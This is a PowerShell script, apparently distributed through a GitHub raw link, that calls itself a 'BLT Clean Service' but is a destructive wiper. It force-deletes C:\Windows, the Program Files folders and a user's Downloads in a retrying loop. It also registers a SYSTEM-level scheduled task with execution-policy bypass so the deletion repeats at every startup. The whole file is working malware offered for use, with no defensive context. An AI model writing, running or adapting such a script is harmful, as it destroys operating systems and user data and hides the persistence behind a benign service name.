# =========================================================================
# MASTERDELETER.PS1 - Self-Managing Perpetual Deletion Service
# Hosted on GitHub Raw Link
# =========================================================================

# --- CONFIGURATION ZONE (EASY TO UPDATE) ---
$TargetPaths = @(
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\Windows",  
    "C:\Users\Admin\Downloads",
    # Add more paths here: "C:\Users\Admin\Videos", etc.
)
$TaskName = "BLT_PerpetualFile"
$TaskDescription = "BLT Service: they are gone! Meow <.>"
$MaxRetries = 5        # How many times to try deleting a single locked file
$InitialDelaySeconds = 2 # Base wait time between deletion attempts
$GlobalPauseSeconds = 10 # Time to wait between full directory sweeps

# --- SCRIPT EXECUTION BLOCK ---

# Ensure the script runs with necessary elevated privileges for Task Scheduler registration
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- URGENCY ALERT ---" -ForegroundColor Red
    Write-Host "This script requires Administrator privileges to register the Task job and delete system files." -ForegroundColor Red
    Write-Host "Please right-click PowerShell and select 'Run as administrator' to execute this script." -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit 1
}

Write-Host "=========================================================" -ForegroundColor Cyan
Write-Host "BLT Clean Service Initiated" -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan


# =========================================================================
# CORE DELETION LOGIC (The Workhorse)
# =========================================================================
function Perform-AggressiveDeletion {
    param(
        [Parameter(Mandatory=$true)]
        [string[]]$PathsToClean
    )

    $IsActive = $true
    while ($IsActive) {
        $AllEmpty = $true

        foreach ($Path in $PathsToClean) {
            Write-Host "`n>>> Scanning Target Path: $Path..." -ForegroundColor Yellow

            try {
                $FilesToDelete = Get-ChildItem -Path $Path -Force -Recurse -ErrorAction SilentlyContinue

                if ($FilesToDelete.Count -gt 0) {
                    $AllEmpty = $false

                    foreach ($File in $FilesToDelete) {
                        $FileDeleted = $false
                        $currentAttempt = 0
                        $delay = $InitialDelaySeconds

                        while (-not $FileDeleted -and $currentAttempt -lt $MaxRetries) {
                            $currentAttempt++

                            try {
                                Remove-Item -Path $File.FullName -Recurse -Force -ErrorAction Stop
                                Write-Host "   [SUCCESS] Deleted: $($File.Name)" -ForegroundColor Green
                                $FileDeleted = $true # Success! Break the inner retry loop
                            } catch {
                                $ErrorMessage = $_.Exception.Message
                                Write-Warning "   [ERROR] Failed to delete $($File.Name). Reason: $ErrorMessage"

                                if ($currentAttempt -lt $MaxRetries) {
                                    Write-Host "   [BOUNCE] Waiting for $delay seconds before retrying (Exponential Backoff)..."
                                    Start-Sleep -Seconds $delay
                                    $delay *= 2 # Exponential backoff
                                } else {
                                    Write-Error "   [FATAL] Max retries reached for $($File.Name). Skipping this file."
                                }
                            }
                        } # End Retry Loop
                    } # End File Iteration Loop
                } else {
                    Write-Host "   [INFO] Path $Path is already empty." -ForegroundColor DarkYellow
                }
            } catch {
                Write-Error "Critical error accessing path {0}: $($_.Exception.Message)" -f $Path
            }
        } # End Path Loop

        if ($AllEmpty) {
            Write-Host "`n=========================================================" -ForegroundColor Cyan
            Write-Host "ALL SPECIFIED TARGETS ARE EMPTY. TERMINATING DELETION LOOP." -ForegroundColor Cyan
            $IsActive = $false
        } else {
            # Global pause: Wait longer between full sweep cycles
            Write-Host "`n--- Full sweep complete. Pausing $GlobalPauseSeconds seconds before re-scanning... ---"
            Start-Sleep -Seconds $GlobalPauseSeconds 
        }
    } # End Main While Loop
}

# =========================================================================
# TASK SCHEDULER REGISTRATION LOGIC
# =========================================================================
function Register-TheService {
    Write-Host "2. Registering the Service in Task Scheduler..." -ForegroundColor Cyan

    # We instruct the Task Scheduler to run this script (the file itself)
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""

    # *** UPDATED TRIGGER: Replaced New-CDLTrigger with standard New-ScheduledTaskTrigger ***
    Write-Host "--- Creating standard PowerShell Task Trigger (AtStartup)..." -ForegroundColor Yellow
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup

    $TaskSettings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RunOnlyIfNetworkAvailable

    # Use 'SYSTEM' account for ultimate power and independence from user login state
    Write-Host "--- Registering job for persistence... ---" -ForegroundColor Yellow
    Register-ScheduledTask -TaskName $TaskName `
                           -Action $TaskAction `
                           -Trigger $TaskTrigger `
                           -Settings $TaskSettings `
                           -Description $TaskDescription `
                           -User "SYSTEM" `
                           -RunLevel Highest `
                           -Force

    Write-Host "   [SUCCESS] Task Scheduler job '$TaskName' successfully registered and set to run at startup with highest privileges." -ForegroundColor Green
}


# =========================================================================
# EXECUTION SEQUENCE
# =========================================================================

# 1. Check if already running (Optional but recommended for idempotency)
if ((Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) -eq $null) {
    Write-Host "--- Task Scheduler Job Not Found. Setting up service for persistence. ---" -ForegroundColor Yellow
    Register-TheService
} else {
    Write-Host "--- Task Scheduler Job '$TaskName' already exists. Skipping registration. ---" -ForegroundColor Yellow
}

# 2. Initiate Immediate Run (Runs right now, useful for testing or instant action)
Write-Host "`n--- Initiating IMMEDIATE execution of the deletion routine... ---" -ForegroundColor Yellow
Perform-AggressiveDeletion -PathsToClean $TargetPaths

Write-Host "`n=========================================================" -ForegroundColor Cyan
Write-Host "Deployment and Immediate Run Complete. Service is now active via Task Scheduler." -ForegroundColor Cyan
Write-Host "=========================================================" -ForegroundColor Cyan